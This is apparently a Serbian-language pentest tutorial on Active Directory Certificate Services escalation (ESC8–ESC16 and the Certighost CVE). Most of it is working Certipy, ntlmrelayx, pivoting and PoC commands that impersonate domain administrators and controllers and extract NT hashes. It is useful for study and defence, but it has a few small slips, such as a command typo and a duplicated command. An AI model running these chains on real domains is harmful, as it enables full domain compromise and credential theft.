Svojstvo `msPKI-Enrollment-Servers` koriste enterprise Certificate Authorities (CA) za čuvanje krajnjih tačaka Certificate Enrollment Service (CES). Ove krajnje tačke mogu se analizirati i izlistati pomoću alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba pomoću [Certipy](https://github.com/ly4k/Certipy)

Certipy podrazumevano šalje zahtev za sertifikat na osnovu template-a `Machine` ili `User`, u zavisnosti od toga da li se ime account-a koji se relay-uje završava znakom `$`. Navođenje alternativnog template-a moguće je pomoću parametra `-template`.

Tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) zatim može da se upotrebi za iznuđivanje autentikacije. Kada se radi sa domain controller-ima, neophodno je navesti `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Bez bezbednosne ekstenzije - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, označena kao ESC9, sprečava ugrađivanje **nove `szOID_NTDS_CA_SECURITY_EXT` security ekstenzije** u sertifikat. Ova zastavica postaje relevantna kada je `StrongCertificateBindingEnforcement` podešen na `1` (podrazumevana postavka), za razliku od vrednosti `2`. Njena relevantnost je veća u scenarijima u kojima bi slabije mapiranje sertifikata za Kerberos ili Schannel moglo da bude iskorišćeno (kao kod ESC10), pošto odsustvo ESC9 ne bi promenilo zahteve.<sup>[[7]](#references)</sup>

Uslovi pod kojima podešavanje ove zastavice postaje značajno uključuju:

- `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevana vrednost je `1`), ili `CertificateMappingMethods` uključuje zastavicu `UPN`.
- Sertifikat ima zastavicu `CT_FLAG_NO_SECURITY_EXTENSION` u okviru podešavanja `msPKI-Enrollment-Flag`.
- Sertifikat navodi bilo koji client authentication EKU.
- Dostupne su `GenericWrite` dozvole nad bilo kojim nalogom kako bi se kompromitovao drugi nalog.

### Scenario zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad nalogom `Jane@corp.local`, sa ciljem kompromitovanja naloga `Administrator@corp.local`. Šablon sertifikata `ESC9`, za koji `Jane@corp.local` ima dozvolu za enrollment, konfigurisan je sa zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u okviru podešavanja `msPKI-Enrollment-Flag`.

Najpre se hash naloga `Jane` dobavlja pomoću Shadow Credentials, zahvaljujući `GenericWrite` dozvolama koje ima `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Nakon toga, `Jane`'s `userPrincipalName` se menja u `Administrator`, namerno izostavljajući deo domena `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova izmena ne krši ograničenja, s obzirom na to da `Administrator@corp.local` ostaje različit kao `userPrincipalName` korisnika `Administrator`.

Nakon toga, ranjivi template sertifikata `ESC9` zahteva se kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Primećeno je da sertifikatov `userPrincipalName` odražava `Administrator`, bez ikakvog „object SID“-a.

`userPrincipalName` korisnice `Jane` se zatim vraća na prvobitnu vrednost, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentifikacije pomoću izdatog sertifikata sada daje NT hash za `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` zbog toga što sertifikat ne navodi domen:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

Na domain controlleru se ESC10 odnosi na dve vrednosti ključeva registra:

- Podrazumevana vrednost za `CertificateMappingMethods` u okviru `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` je `0x18` (`0x8 | 0x10`), a prethodno je bila postavljena na `0x1F`.
- Podrazumevana postavka za `StrongCertificateBindingEnforcement` u okviru `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` je `1`, a prethodno je bila `0`.<sup>[[7]](#references)</sup>

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`.

**Slučaj 2**

Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Abuse Case 1

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`, nalog A sa `GenericWrite` dozvolama može biti iskorišćen za kompromitovanje bilo kog naloga B.

Na primer, ako napadač ima `GenericWrite` dozvole nad nalogom `Jane@corp.local`, cilj mu je da kompromituje `Administrator@corp.local`. Procedura je ista kao kod ESC9, što omogućava korišćenje bilo kog certificate template-a.

Najpre se preuzima hash naloga `Jane` pomoću Shadow Credentials, iskorišćavanjem `GenericWrite` dozvole.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `userPrincipalName` korisnika `Jane` menja se u `Administrator`, pri čemu se namerno izostavlja deo `@corp.local` kako bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga, sertifikat koji omogućava autentifikaciju klijenta zatražen je kao `Jane`, koristeći podrazumevani šablon `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` se zatim vraća na prvobitnu vrednost, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacija dobijenim sertifikatom će otkriti NT hash za `Administrator@corp.local`, što zahteva navođenje domena u komandi zbog odsustva podataka o domenu u sertifikatu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Slučaj zloupotrebe 2

Kada `CertificateMappingMethods` sadrži bit zastavicu `UPN` (`0x4`), nalog A sa dozvolama `GenericWrite` može da kompromituje bilo koji nalog B koji nema svojstvo `userPrincipalName`, uključujući mašinske naloge i ugrađenog administratora domena `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od pribavljanja hash-a naloga `Jane` putem Shadow Credentials, koristeći `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` korisnika `Jane` se zatim postavlja na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Sertifikat za autentikaciju klijenta zahteva se za korisnika `Jane` koristeći podrazumevani šablon `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` vraća se na originalnu vrednost nakon ovog procesa.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Za autentifikaciju putem Schannel-a koristi se opcija `-ldap-shell` alata Certipy, što ukazuje na uspešnu autentifikaciju kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande kao što je `set_rbcd` omogućavaju Resource-Based Constrained Delegation (RBCD) napade, koji potencijalno mogu kompromitovati kontroler domena.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na svaki korisnički nalog kojem nedostaje `userPrincipalName` ili se on ne podudara sa `sAMAccountName`, pri čemu je podrazumevani `Administrator@corp.local` glavna meta zbog svojih povišenih LDAP privilegija i činjenice da mu `userPrincipalName` podrazumevano nedostaje.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, moguće je izvršiti NTLM relay napade bez potpisivanja putem RPC servisa. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Možete koristiti `certipy` da proverite da li je `Enforce Encryption for Requests` onemogućen; certipy će prikazati `ESC11` Vulnerabilities.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario zloupotrebe

Potrebno je podesiti relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za kontrolere domena moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Objašnjenje

Administratori mogu da podese Certificate Authority tako da ga skladišti na eksternom uređaju kao što je "Yubico YubiHSM2".

Ako je USB uređaj povezan sa CA serverom putem USB porta ili putem USB device servera u slučaju da je CA server virtualna mašina, potreban je authentication key (koji se ponekad naziva "password") da bi Key Storage Provider generisao i koristio ključeve u uređaju YubiHSM.

Ovaj key/password je sačuvan u registru, u okviru `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, u čistom tekstu.

Reference su dostupne [ovde](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario zloupotrebe

Ako je privatni ključ CA uskladišten na fizičkom USB uređaju i dobijete shell access, moguće je povratiti ključ.

Prvo je potrebno da nabavite CA certificate (on je javan), a zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finally, koristite certutil komandu `-sign` da biste falsifikovali novi proizvoljni sertifikat koristeći CA sertifikat i njegov privatni ključ.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u certificate template. Objekti `msPKI-Enterprise-Oid`, odgovorni za izdavanje politika, mogu se otkriti u Configuration Naming Context-u (CN=OID,CN=Public Key Services,CN=Services) PKI OID kontejnera. Politika se može povezati sa AD grupom pomoću atributa `msDS-OIDToGroupLink` ovog objekta, čime se sistemu omogućava da autorizuje korisnika koji priloži sertifikat kao da je član te grupe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Drugim rečima, kada korisnik ima dozvolu da enroll-uje sertifikat, a sertifikat je povezan sa OID grupom, korisnik može naslediti privilegije te grupe.

Koristite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da biste pronašli OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario zloupotrebe

Pronađite dozvolu korisnika pomoću `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu da se prijavi za `VulnerableTemplate`, korisnik može naslediti privilegije grupe `VulnerableGroup`.

Sve što treba da uradi jeste da navede template; dobiće certificate sa pravima `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Ranljiva konfiguracija obnove sertifikata - ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. U nastavku je citat originalnog teksta.<sup>[[14]](#references)</sup>

ESC14 se odnosi na ranjivosti koje proizlaze iz „slabog eksplicitnog mapiranja sertifikata“, prvenstveno usled zloupotrebe ili nesigurne konfiguracije atributa `altSecurityIdentities` na Active Directory korisničkim ili računarskim nalozima. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhe autentifikacije. Kada je popunjen, ova eksplicitna mapiranja mogu nadjačati podrazumevanu logiku mapiranja sertifikata, koja se obično oslanja na UPN ili DNS imena u SAN-u sertifikata, odnosno na SID ugrađen u bezbednosnu ekstenziju `szOID_NTDS_CA_SECURITY_EXT`.

„Slabo“ mapiranje nastaje kada je vrednost stringa korišćena unutar atributa `altSecurityIdentities` za identifikaciju sertifikata previše široka, lako pogodiva, oslanja se na nejedinstvena polja sertifikata ili koristi komponente sertifikata koje se lako mogu lažirati. Ako napadač može da pribavi ili izradi sertifikat čiji atributi odgovaraju ovako slabo definisanom eksplicitnom mapiranju privilegovanog naloga, može koristiti taj sertifikat za autentifikaciju kao taj nalog i njegovo lažno predstavljanje.

Primeri potencijalno slabih stringova za mapiranje atributa `altSecurityIdentities` uključuju:

- Mapiranje isključivo na osnovu uobičajenog Common Name-a (CN) subjekta: npr. `X509:<S>CN=SomeUser`. Napadač bi mogao da pribavi sertifikat sa ovim CN-om iz manje bezbednog izvora.
- Korišćenje previše opštih Distinguished Name-ova (DN) izdavaoca ili subjekta bez dodatne kvalifikacije, kao što su konkretni serijski broj ili identifikator ključa subjekta: npr. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Korišćenje drugih predvidivih obrazaca ili nekriptografskih identifikatora koje napadač može da ispuni u sertifikatu koji može legitimno da pribavi ili falsifikuje (ako je kompromitovao CA ili pronašao ranjiv template kao kod ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapiranje prema punim DN-ovima izdavaoca i subjekta)
- `X509:<SKI>SubjectKeyIdentifier` (mapiranje prema vrednosti ekstenzije Subject Key Identifier sertifikata)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapiranje prema serijskom broju, implicitno kvalifikovanom DN-om izdavaoca) - ovo nije standardni format; obično je `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapiranje prema RFC822 imenu, obično email adresi, iz SAN-a)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapiranje prema SHA1 hash-u sirovog javnog ključa sertifikata - generalno snažno)

Bezbednost ovih mapiranja u velikoj meri zavisi od specifičnosti, jedinstvenosti i kriptografske snage izabranih identifikatora sertifikata korišćenih u stringu za mapiranje. Čak i kada su na Domain Controllerima omogućeni snažni režimi povezivanja sertifikata (koji prvenstveno utiču na implicitna mapiranja zasnovana na SAN UPN-ovima/DNS imenima i SID ekstenziji), loše konfigurisan unos `altSecurityIdentities` i dalje može predstavljati direktan put ka lažnom predstavljanju ako je sama logika mapiranja neispravna ili previše permisivna.

### Scenario zloupotrebe

ESC14 cilja **eksplicitna mapiranja sertifikata** u Active Directory-ju (AD), konkretno atribut `altSecurityIdentities`. Ako je ovaj atribut podešen (namerno ili usled pogrešne konfiguracije), napadači mogu da se lažno predstave kao nalozi tako što će prezentovati sertifikate koji odgovaraju mapiranju.

#### Scenario A: Napadač može da upisuje u `altSecurityIdentities`

**Preduslov**: Napadač ima dozvole za upis u atribut `altSecurityIdentities` ciljnog naloga ili dozvolu da mu dodeli tu mogućnost kroz jednu od sledećih dozvola na ciljnom AD objektu:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Cilj ima slabo mapiranje putem X509RFC822 (Email)

- **Preduslov**: Cilj ima slabo X509RFC822 mapiranje u atributu `altSecurityIdentities`. Napadač može da podesi atribut `mail` žrtve tako da odgovara X509RFC822 imenu cilja, da izda sertifikat za žrtvu i da ga koristi za autentifikaciju kao cilj.

#### Scenario C: Cilj ima X509IssuerSubject mapiranje

- **Preduslov**: Cilj ima slabo eksplicitno X509IssuerSubject mapiranje u atributu `altSecurityIdentities`. Napadač može da podesi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subject-u X509IssuerSubject mapiranja cilja. Zatim napadač može da izda sertifikat za žrtvu i da ga koristi za autentifikaciju kao cilj.

#### Scenario D: Cilj ima X509SubjectOnly mapiranje

- **Preduslov**: Cilj ima slabo eksplicitno X509SubjectOnly mapiranje u atributu `altSecurityIdentities`. Napadač može da podesi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subject-u X509SubjectOnly mapiranja cilja. Zatim napadač može da izda sertifikat za žrtvu i da ga koristi za autentifikaciju kao cilj.

### konkretne operacije
#### Scenario A

Zatražite sertifikat template-a sertifikata `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sačuvaj i konvertuj sertifikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autentifikujte se (koristeći sertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Čišćenje (opciono)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Za specifičnije metode napada u različitim scenarijima napada pogledajte sledeće: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

Opis na adresi https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc je izuzetno detaljan. U nastavku je citat originalnog teksta.<sup>[[15]](#references)</sup>

Korišćenjem ugrađenih podrazumevanih sertifikatskih predložaka verzije 1, napadač može da izradi CSR koji uključuje application policies koje imaju prednost u odnosu na konfigurisane Extended Key Usage atribute navedene u predlošku. Jedini zahtev su prava upisa, a ovo se može koristiti za generisanje sertifikata za autentifikaciju klijenta, certificate request agent sertifikata i codesigning sertifikata pomoću predloška **_WebServer_**

### Zloupotreba

[Certipy privilege-escalation dokumentacija](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) sadrži detaljnije primere upotrebe.<sup>[[14]](#references)</sup>


Certipy-jeva komanda `find` može pomoći u identifikovanju V1 predložaka koji su potencijalno podložni za ESC15 ako CA nije zakrpljen.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direktno impersoniranje putem Schannel-a

**Korak 1: Zatražite sertifikat, ubacujući „Client Authentication“ Application Policy i ciljni UPN.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći V1 template „WebServer“ (koji omogućava da enrollee dostavi subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Ranljivi V1 template sa opcijom "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u ekstenziju Application Policies CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN za impersonaciju.

**Korak 2: Autentifikujte se putem Schannel-a (LDAPS) koristeći dobijeni sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation putem zloupotrebe Enrollment Agent-a

**Korak 1: Zatražite certificate iz V1 template-a (sa opcijom „Enrollee supplies subject“), uz ubacivanje Application Policy-ja „Certificate Request Agent“.** Ovaj certificate je namenjen attacker-u (`attacker@corp.local`) kako bi postao enrollment agent. Za sopstveni identitet attacker-a ovde nije naveden UPN, jer je cilj dobijanje mogućnosti enrollment agent-a.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Umeće OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Koristite "agent" certificate da zatražite certificate u ime ciljanog privilegovanog korisnika.** Ovo je korak sličan ESC3, koji koristi certificate iz Koraka 1 kao agent certificate.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći sertifikat „on-behalf-of“.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Objašnjenje

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi se na scenario u kojem, ako konfiguracija AD CS ne zahteva uključivanje ekstenzije **szOID_NTDS_CA_SECURITY_EXT** u sve sertifikate, napadač ovo može da iskoristi za:

1. Zahtevanje sertifikata **bez SID binding-a**.

2. Korišćenje ovog sertifikata za authentication kao bilo koji nalog, na primer za impersonation naloga sa visokim privilegijama (npr. Domain Administrator).

Takođe možete pogledati ovaj članak da biste saznali više o detaljnom principu:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Sledeće je preuzeto sa [ovog linka](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), kliknite da biste videli detaljnije metode korišćenja.<sup>[[14]](#references)</sup>

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) ranjivo na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Korak 1: Pročitajte početni UPN naloga žrtve (opciono - radi vraćanja).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Korak 2: Ažurirajte UPN naloga žrtve na `sAMAccountName` ciljnog administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Korak 3: (Ako je potrebno) Pribavite credentials za nalog „žrtve“ (npr. putem Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Korak 4: Zatražite sertifikat kao korisnik „žrtva“ iz _bilo kog odgovarajućeg client authentication template-a_ (npr. „User“) na CA ranjivom na ESC16.** Pošto je CA ranjiv na ESC16, automatski će izostaviti SID security extension iz izdatog sertifikata, bez obzira na konkretna podešavanja ovog extension-a u template-u. Podesite environment variable za Kerberos credential cache (shell komanda):
```bash
export KRB5CCNAME=victim.ccache
```
Zatim zatražite sertifikat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Korak 5: Vratite UPN naloga „žrtve“.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Korak 6: Autentifikujte se kao ciljni administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Objašnjenje

**Certighost** zloupotrebljava **AD CS enrollment chase / callback path**, gde CA veruje atributima zahteva koje dostavlja requester prilikom određivanja identiteta koji treba da bude upisan u izdat sertifikat. U javnom PoC-u, izrađeni zahtev uključuje:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP pod kontrolom napadača koji će CA kontaktirati
- **`rmd`**: **DNS naziv ciljnog Domain Controller-a** za impersonaciju

Ako CA prati taj chase, povezaće se sa napadačem preko **SMB/LSA (`445`)** i **LDAP (`389`)**. Napadač koristi **stvarni machine account** (obično kreiran preko podrazumevanog **`ms-DS-MachineAccountQuota`**) tako da se callback sesija autentifikuje kao važeći domain principal, ali rogue servisi umesto toga vraćaju atribute identiteta **ciljnog DC-a**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ako CA **kriptografski ne poveže vraćeni identitet sa autentifikovanim callback principalom**, može izdati sertifikat za **Domain Controller**, iako je sesija autentifikovana pomoću machine account-a pod kontrolom napadača. Zbog toga se ova greška konceptualno razlikuje od **Certifried**: umesto menjanja AD atributa kao što je `dNSHostName`, napadač **zamenjuje podatke identiteta tokom CA callback resolution-a**.<sup>[[2]](#references)</sup>

**Korisni preduslovi:**

- Niskoprivilegovani **domain credentials**
- Mogućnost **kreiranja ili ponovne upotrebe computer account-a**
- Mrežna dostupnost od **CA** do portova **`389` i `445`** pod kontrolom napadača
- Vulnerable / nepatchovan CA request path (Microsoft update od **14. jula 2026.** dodao je **DC validation za `cdc`** i **poređenje resolved-SID vrednosti**)

Dobijeni **`.pfx`** zatim može da se koristi za **PKINIT**, čime se dobija **`.ccache`** i, prema objavljenom PoC flow-u, NT hash **ciljnog DC-a**, što je obično dovoljno za **potpunu kompromitaciju domena**.

### Zloupotreba

Javni PoC automatizuje ceo chain:<sup>[[1]](#references)</sup>

1. Kreira ili ponovo koristi **machine account** pod kontrolom napadača.
2. Pokreće **rogue LDAP i SMB/LSA listeners** na portovima `389` i `445`.
3. Šalje certificate request koji sadrži atribute **`cdc`** pod kontrolom napadača i ciljni **`rmd`**.
4. Omogućava CA-u da se autentifikuje na rogue listenerima pomoću kontrolisanog machine account-a, ali na identity lookup zahteve odgovara atributima **ciljnog DC-a**.
5. Prima CA-signed **DC certificate**, a zatim ga koristi za **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Korisne runtime zastavice iz PoC-a:

- `--listener <ip>`: eksplicitno bira callback IP oglašen u `cdc`
- `--computer-name <NAME$>`: ponovo koristi postojeći machine account umesto kreiranja novog

**Operativne napomene:**

- PoC zahteva **root** jer vezuje **privilegovane portove** `389` i `445`.
- Uspešna eksploatacija lokalno upisuje **DC `.pfx`** i **Kerberos `.ccache`**.
